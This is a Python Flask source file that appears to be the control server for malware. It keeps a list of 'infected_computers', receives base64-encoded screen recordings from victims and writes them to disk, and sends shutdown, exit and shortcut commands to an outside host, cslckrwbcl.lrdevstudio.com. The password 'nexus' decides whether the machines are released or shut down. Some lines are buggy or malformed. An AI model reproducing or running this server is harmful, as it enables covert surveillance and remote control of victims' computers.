import os
import base64
import requests
from flask_cors import CORS
from werkzeug.utils import secure_filename
from flask import Flask, send_file, request, redirect, url_for
 
app = Flask(__name__)
CORS(app, supports_credentials=True)

messages = []
temp_message = []
infected_computers = []

for computer in infected_computers:
    requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': f'updatewbcl-{computer}'})

@app.route('/', methods=['GET', 'POST'])
def home():
    for computer in infected_computers:
        requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': f'create_shortcut-{computer}'})
    if request.method == 'POST':
        password = request.form.get('password')
        if password == 'nexus':
            return redirect(url_for('success'))
        else:
            return redirect(url_for('failure'))
    return send_file('templates/index.html')

@app.route('/success')
def success():
    for computer in infected_computers:
        requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': f'exit-{computer}'})
    return send_file('templates/success.html')

@app.route('/failure')
def failure():
    for computer in infected_computers:
        requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': f'shutdown-{computer}'})
        requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': f'exit-{computer}'})
    return send_file('templates/failure.html')

@app.route('/resources/<path>')
def resources(path):
    return send_file(os.path.join('templates', path))

@app.route('/messages', methods=['POST', 'GET'])
def handle_messages():
    if request.method == 'POST':
        message = request.get_json()

        if message.get('video'):
            filename = message.get('filename')
            print(filename)
            filepath = f'screen_recordings/{filename}'
            
            video_data = base64.b64decode(message['video'])
            video_base64 = message['video']

            if ',' in video_base64:
                video_base64 = video_base64.split(',')[1]

            video_data = base64.b64decode(video_base64)

            with open(filepath, 'wb') as f:
                f.write(video_data)
            
            print(f'Video uploaded successfully: {filename}')
            return {'status': 'success', 'filename': filename}
                
        messages.append(message)
        if message.get('computer_name'):
            if message.get('computer_name').upper() not in infected_computers:
                infected_computers.append(message.get('computer_name').upper())
            print('New Computer: ', message.get('computer_name').upper())
        if message.get('all_computers'):
            print('Computers Requested, returning: ', infected_computers)
            return infected_computers
        if message.get('collect-recorded-${computer}'):
            return 
        print('Recieved message: ', message)
        return {'status': 'success'}
    else:        
        print(infected_computers)
        print('Sent message: ', messages)
        temp_message = messages
        messages.clear()
        return temp_message
    temp_message.clear()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8004, debug=True)
